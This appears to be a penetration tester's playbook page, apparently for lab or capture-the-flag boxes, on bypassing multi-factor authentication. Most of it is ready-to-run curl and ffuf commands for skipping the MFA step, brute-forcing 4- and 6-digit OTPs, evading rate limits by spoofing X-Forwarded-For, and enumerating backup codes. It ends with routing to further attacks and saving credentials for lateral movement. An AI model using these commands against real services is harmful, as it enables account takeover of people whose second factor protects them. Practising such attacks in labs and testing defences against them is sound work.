
Bypass multi-factor authentication (MFA / 2FA / OTP). Entry from [[Web Attack Checksheet]] sub-block 1.6 when multi-step verification observed.

Sister files: [[Credential Attacks]] (first-factor password recovery), [[Session Cookie Attacks]] (session state manipulation), [[Login Bypass Techniques]] (may bypass first factor).

Precondition: valid first-factor credentials (username + password). If not yet recovered → return to [[Credential Attacks]] before entering this file.

Ordering: skip-step attacks first (fastest — one request may bypass entirely); OTP brute force (fast if rate limit weak); backup code enumeration (if backup mechanism exists).

Lean version — depth added per real-box encounter under build-when-encountered.

---

## 1. Skip-step / direct endpoint access

Some apps only enforce MFA in the UI flow; the post-MFA endpoint accepts requests without verifying MFA completion.

**Precondition:** valid first-factor auth completed, session cookie captured, but MFA prompt not yet satisfied.

**Enumerate post-MFA endpoints.** Complete a normal login-then-MFA flow with your own account (or a captured target session). Note the URL you land on after MFA completion (e.g. `/dashboard`, `/account`, `/home`).

**Attempt direct access with pre-MFA session cookie:**

```bash
# Log in but don't complete MFA
curl -sX POST -c cookies.txt -d 'username=<target_user>&password=<target_pass>' http://<host>:<port>/<login_path>

# Try post-MFA endpoint directly
curl -s -b cookies.txt -i http://<host>:<port>/<post_mfa_path>
```

Also try:

- Change POST to GET, GET to POST on the MFA-completion endpoint
- Send the MFA-completion endpoint with empty body / no MFA code
- Include `Referer: http://<host>:<port>/<login_path>` header (some apps trust Referer as proof of flow)

Route:

- Post-MFA content served without MFA completion → bypass confirmed → Section 4
- All variants require MFA → 2

---

## 2. OTP brute force

If OTP is short (4-6 digits) and rate limiting is weak, brute force the code space.

**Rate-limit probe.** With a captured MFA session (post-password, pre-code), send 15 known-bad OTP guesses:

```bash
for i in $(seq 1 15); do
  curl -sX POST -b cookies.txt -o /dev/null -w '[%{http_code}][size:%{size_download}][time:%{time_total}s]\n' -d "otp=000$i" http://<host>:<port>/<mfa_verify_path>
done
```

Route on probe:

- HTTP 429 or session invalidated after N attempts → hard rate limit; skip to 3 (backup codes) unless bypass tricks below work
- No rate limit observed → 2.1

### 2.1 Full OTP brute force

For 4-digit OTP (10000 code space):

`ffuf -w <(seq -w 0 9999) -X POST -H 'Cookie: <captured_session_cookie>' -d 'otp=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<mfa_verify_path> -fr '<incorrect_otp_signal>' -t <threads>`

For 6-digit OTP (1000000 code space):

`ffuf -w <(seq -w 0 999999) -X POST -H 'Cookie: <captured_session_cookie>' -d 'otp=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<mfa_verify_path> -fr '<incorrect_otp_signal>' -t <threads>`

### 2.2 Rate-limit bypass tricks (if hard limit observed in probe)

Try IP rotation via header injection:

`ffuf -w <(seq -w 0 9999) -X POST -H 'Cookie: <captured_session_cookie>' -H 'X-Forwarded-For: FUZZ2' -w <(for i in $(seq 1 254); do echo "192.168.1.$i"; done):FUZZ2 -d 'otp=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<mfa_verify_path> -fr '<incorrect_otp_signal>' -mode clusterbomb -t <threads>`

Also try:

- Fresh session per attempt (re-login before each OTP attempt — expensive but defeats per-session limits)
- Alternative endpoints (`<mfa_verify_path>.json`, `<mfa_verify_path>/api`, `/api/verify`)

Route:

- Correct OTP found (response differs from `<incorrect_otp_signal>`) → 4
- Exhausted → 3

---

## 3. Backup code enumeration

If MFA offers backup codes (typically shorter than OTP, generated at MFA setup), the backup code endpoint often has weaker protection than primary OTP.

**Discover backup code endpoint.** Common paths:

```bash
for p in /backup-code /backup_code /recovery-code /recovery /2fa/backup /2fa/recovery /mfa/backup /mfa/recovery; do
  echo -n "$p → "
  curl -s -o /dev/null -w '%{http_code}\n' -b cookies.txt http://<host>:<port>$p
done
```

If endpoint found (200 or 302 response with content):

**Brute force backup codes.** Backup codes are commonly 8-character alphanumeric. If format is `XXXX-XXXX` or `XXXXXXXX`:

`ffuf -w /usr/share/seclists/Fuzzing/8-char-alphanumeric.txt -X POST -H 'Cookie: <captured_session_cookie>' -d 'code=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<backup_endpoint> -fr '<incorrect_code_signal>' -t <threads>`

If wordlist doesn't exist, generate:

```bash
tr -dc 'A-Z0-9' < /dev/urandom | fold -w 8 | head -100000 > /tmp/backup_codes.txt
# Better: seq for numeric-only, or crunch for full alphanumeric
```

Route:

- Correct backup code found → 4
- Exhausted → Exhaustion

---

## 4. Post-bypass routing

On successful MFA bypass:

1. Log to `route_<ip>.txt`:

    `printf '[MFA Bypass] APPLIED: bypass via <technique> on <host>:<port>\n' >> route_<ip>.txt`

2. Capture full authenticated session (post-MFA cookie):

    `curl -sX POST -b cookies.txt -c cookies_authed.txt -d 'otp=<recovered_code>' http://<host>:<port>/<mfa_verify_path>`

3. Route:

- Fully authenticated session (post-MFA) → route to [[Credential Attacks]] Section 6 (post-success routing) — same downstream routing applies (JWT tampering, admin RCE, PrivEsc, lateral)
- Direct-access bypass (Section 1) without MFA session → attempt to load post-login functionality; check what's reachable and what's not (some apps enforce MFA per-action, not per-session)

---

## Exhaustion

Sections 1-3 all exhausted without MFA bypass → MFA is intact. Return to [[Web Attack Checksheet]] Step 1 walking. First-factor credentials still valuable — save to `creds_<host>.txt` for cross-service lateral (SSH, database, non-MFA-protected services).
